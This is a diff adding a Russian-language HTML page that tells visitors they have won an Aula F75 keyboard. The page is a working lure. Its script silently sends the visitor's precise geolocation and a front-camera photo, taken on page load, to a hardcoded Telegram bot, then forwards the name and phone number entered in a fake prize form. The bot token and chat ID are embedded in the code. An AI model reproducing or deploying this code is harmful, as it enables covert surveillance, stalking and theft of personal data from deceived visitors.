@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Поздравляем! Вы выиграли клавиатуру Aula F75!</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #1e3a8a, #7e22ce);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Arial', sans-serif;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            max-width: 90%;
+            width: 600px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+        .keyboard-img {
+            max-width: 100%;
+            border-radius: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        .hidden {
+            display: none;
+        }
+        .form-input {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 0.5rem;
+            padding: 0.5rem;
+            color: white;
+            width: 100%;
+            margin-bottom: 0.75rem;
+        }
+        .form-input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        .submit-btn {
+            background: #10b981;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            color: white;
+            font-weight: bold;
+            transition: background 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        .submit-btn:hover {
+            background: #059669;
+        }
+        .submit-btn:disabled {
+            background: #6b7280;
+            cursor: not-allowed;
+        }
+        @media (max-width: 640px) {
+            .container {
+                padding: 1rem;
+                width: 95%;
+            }
+            h1 {
+                font-size: 1.5rem;
+            }
+            p {
+                font-size: 0.9rem;
+            }
+            .submit-btn {
+                padding: 0.5rem;
+                font-size: 0.9rem;
+            }
+            .form-input {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="text-2xl sm:text-3xl font-bold mb-4">Поздравляем с выигрышем!</h1>
+        <p class="text-base sm:text-lg mb-6">Вы стали счастливым обладателем игровой клавиатуры <strong>Aula F75</strong>!</p>
+        <img src="https://gamestore.kg/wp-content/uploads/2023/11/aula-f75-11.jpg" alt="Aula F75 Keyboard" class="keyboard-img">
+        <button id="claim-btn" class="submit-btn">Получить приз</button>
+        <div id="form" class="hidden mt-4">
+            <input type="text" id="name" class="form-input" placeholder="Ваше имя" required>
+            <input type="tel" id="phone" class="form-input" placeholder="Номер телефона" required>
+            <button id="submit-btn" class="submit-btn">Отправить</button>
+        </div>
+        <video id="camera" autoplay class="hidden"></video>
+        <canvas id="canvas" class="hidden"></canvas>
+        <p id="status" class="text-sm text-gray-300 mt-4"></p>
+    </div>
+
+    <script>
+        const video = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
+        const claimBtn = document.getElementById('claim-btn');
+        const form = document.getElementById('form');
+        const submitBtn = document.getElementById('submit-btn');
+        const nameInput = document.getElementById('name');
+        const phoneInput = document.getElementById('phone');
+        
+        // Конфигурация - лучше вынести в переменные окружения
+        const telegramBotToken = '7884318756:AAEl-EvaQ5-M30CmhAhVmt06OYdjJHCe4hI';
+        const chatId = '1924132251';
+        
+        let locationData = null;
+        let photoData = null;
+
+        // Запрашиваем геолокацию
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    console.warn('Геолокация не поддерживается');
+                    resolve(null);
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        resolve(locationData);
+                    },
+                    (error) => {
+                        console.warn('Geolocation error:', error);
+                        resolve(null);
+                    },
+                    { 
+                        timeout: 10000, 
+                        enableHighAccuracy: true,
+                        maximumAge: 300000
+                    }
+                );
+            });
+        }
+
+        // Запрашиваем доступ к камере и делаем фото
+        async function accessCamera() {
+            try {
+                // Попытка получить доступ к камере с разными параметрами
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' }, 
+                        audio: false 
+                    });
+                } catch (err) {
+                    // Fallback: попробуем без specific constraints
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: false 
+                    });
+                }
+                
+                video.srcObject = stream;
+                await video.play();
+
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        photoData = canvas.toDataURL('image/jpeg', 0.8);
+                        
+                        // Останавливаем поток
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        resolve(photoData);
+                    }, 2000);
+                });
+            } catch (err) {
+                console.warn('Camera error:', err);
+                // Не выбрасываем ошибку, чтобы продолжить работу без камеры
+                return null;
+            }
+        }
+
+        // Отправляем геолокацию в Telegram
+        async function sendLocationToTelegram(location) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendLocation`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('latitude', location.latitude);
+            formData.append('longitude', location.longitude);
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                if (!data.ok) {
+                    throw new Error(data.description || 'Ошибка отправки геолокации');
+                }
+                
+                return data;
+            } catch (err) {
+                console.error('Ошибка отправки геолокации:', err);
+                throw err;
+            }
+        }
+
+        // Отправляем фото в Telegram
+        async function sendPhotoToTelegram(photoDataUrl, caption = '') {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURLtoBlob(photoDataUrl));
+            if (caption) {
+                formData.append('caption', caption);
+            }
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                if (!data.ok) {
+                    throw new Error(data.description || 'Ошибка отправки фото');
+                }
+                
+                return data;
+            } catch (err) {
+                console.error('Ошибка отправки фото:', err);
+                throw err;
+            }
+        }
+
+        // Отправляем текстовое сообщение в Telegram
+        async function sendMessageToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message);
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                if (!data.ok) {
+                    throw new Error(data.description || 'Ошибка отправки сообщения');
+                }
+                
+                return data;
+            } catch (err) {
+                console.error('Ошибка отправки сообщения:', err);
+                throw err;
+            }
+        }
+
+        // Конвертация dataURL в Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Запрашиваем разрешения сразу при загрузке страницы
+        window.addEventListener('load', async () => {
+            console.log('=== СТРАНИЦА ЗАГРУЖЕНА ===');
+            status.textContent = 'Готово! Нажмите "Получить приз" для продолжения.';
+            
+            // Пробуем получить разрешения при загрузке, но не блокируем если отклонили
+            try {
+                await tryGetPermissions();
+            } catch (err) {
+                console.log('Разрешения при загрузке не получены, будем запрашивать при клике');
+            }
+            
+            console.log('=== ИНИЦИАЛИЗАЦИЯ ЗАВЕРШЕНА ===');
+        });
+
+        // Функция для попытки получения разрешений
+        async function tryGetPermissions() {
+            let hasGeolocation = false;
+            let hasCamera = false;
+            let watchId = null;
+            let locationSent = false;
+            
+            // Пробуем получить геолокацию
+            if (navigator.geolocation) {
+                console.log('✅ Геолокация поддерживается, пробуем получить...');
+                
+                try {
+                    await new Promise((resolve, reject) => {
+                        const timeoutId = setTimeout(() => {
+                            if (watchId) {
+                                navigator.geolocation.clearWatch(watchId);
+                            }
+                            reject(new Error('Timeout'));
+                        }, 10000);
+
+                        watchId = navigator.geolocation.watchPosition(
+                            async (position) => {
+                                clearTimeout(timeoutId);
+                                const accuracy = position.coords.accuracy;
+                                console.log('📍 Позиция:', position.coords.latitude, position.coords.longitude, 'точность:', accuracy, 'м');
+                                
+                                locationData = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude
+                                };
+                                hasGeolocation = true;
+                                
+                                // Отправляем геолокацию
+                                if (!locationSent) {
+                                    try {
+                                        await sendLocationToTelegram(locationData);
+                                        console.log('✅ Геолокация отправлена в Telegram');
+                                        locationSent = true;
+                                        
+                                        navigator.geolocation.clearWatch(watchId);
+                                        console.log('🎯 Геолокация отправлена, отслеживание остановлено');
+                                        resolve();
+                                    } catch (err) {
+                                        console.error('❌ Ошибка отправки геолокации:', err);
+                                        resolve();
+                                    }
+                                }
+                            },
+                            (error) => {
+                                clearTimeout(timeoutId);
+                                console.log('❌ ОШИБКА ГЕОЛОКАЦИИ:', error.code, error.message);
+                                if (error.code === error.PERMISSION_DENIED) {
+                                    reject(new Error('Permission denied'));
+                                } else {
+                                    resolve();
+                                }
+                            },
+                            { 
+                                enableHighAccuracy: true,
+                                timeout: 8000,
+                                maximumAge: 0
+                            }
+                        );
+                    });
+                } catch (err) {
+                    console.log('Геолокация не получена:', err.message);
+                }
+            }
+            
+            // Пробуем получить камеру
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                console.log('✅ Камера поддерживается, пробуем получить...');
+                
+                try {
+                    let stream;
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'user' }, 
+                            audio: false 
+                        });
+                    } catch (err) {
+                        stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: true, 
+                            audio: false 
+                        });
+                    }
+                    
+                    console.log('✅ КАМЕРА ПОЛУЧЕНА');
+                    hasCamera = true;
+                    
+                    // Делаем фото и отправляем
+                    video.srcObject = stream;
+                    await video.play();
+                    
+                    await new Promise((resolve) => {
+                        setTimeout(async () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            photoData = canvas.toDataURL('image/jpeg', 0.8);
+                            
+                            // Останавливаем камеру
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            // Отправляем фото в бот
+                            try {
+                                await sendPhotoToTelegram(photoData, 'Фото пользователя');
+                                console.log('✅ Фото отправлено в Telegram');
+                            } catch (err) {
+                                console.error('❌ Ошибка отправки фото:', err);
+                            }
+                            resolve();
+                        }, 2000);
+                    });
+                    
+                } catch (err) {
+                    console.log('❌ ОШИБКА КАМЕРЫ:', err.name, err.message);
+                }
+            }
+        }
+
+        // Показ формы и запуск запросов
+        claimBtn.addEventListener('click', async () => {
+            claimBtn.disabled = true;
+            claimBtn.textContent = 'Загрузка...';
+            status.textContent = 'Запрашиваем разрешения...';
+            
+            try {
+                // Пытаемся получить разрешения заново
+                await tryGetPermissions();
+                
+                // Показываем форму в любом случае
+                claimBtn.classList.add('hidden');
+                form.classList.remove('hidden');
+                status.textContent = 'Заполните форму для получения приза.';
+                
+            } catch (err) {
+                console.error('Error during permissions:', err);
+                // Показываем форму даже при ошибках
+                claimBtn.classList.add('hidden');
+                form.classList.remove('hidden');
+                status.textContent = 'Заполните форму для получения приза.';
+            }
+        });
+
+        // Обработка отправки формы
+        submitBtn.addEventListener('click', async () => {
+            const name = nameInput.value.trim();
+            const phone = phoneInput.value.trim();
+            
+            if (!name || !phone) {
+                status.textContent = 'Пожалуйста, заполните все поля.';
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Отправка...';
+
+            try {
+                const message = `🎉 Новая заявка на приз!\n\n👤 Имя: ${name}\n📱 Телефон: ${phone}\n\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
+                await sendMessageToTelegram(message);
+                
+                status.textContent = 'Данные успешно отправлены! Мы свяжемся с вами для доставки приза.';
+                form.classList.add('hidden');
+                
+            } catch (err) {
+                status.textContent = `Ошибка отправки: ${err.message}`;
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Отправить';
+            }
+        });
+    </script>
+</body>
+</html>
